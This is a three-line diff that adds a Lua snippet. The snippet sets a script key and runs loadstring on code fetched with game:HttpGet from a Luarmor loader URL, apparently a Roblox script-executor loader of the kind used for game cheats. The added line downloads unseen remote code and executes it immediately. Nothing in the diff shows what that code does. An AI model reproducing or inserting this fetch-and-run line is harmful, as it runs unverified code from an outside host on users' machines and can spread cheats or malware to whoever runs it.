@@ -1,0 +1,3 @@
+script_key = "tAhtak-xusgup-xexju4";
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/e79fd56fce6623cf28e04037543e45bd.lua"))()
+ 
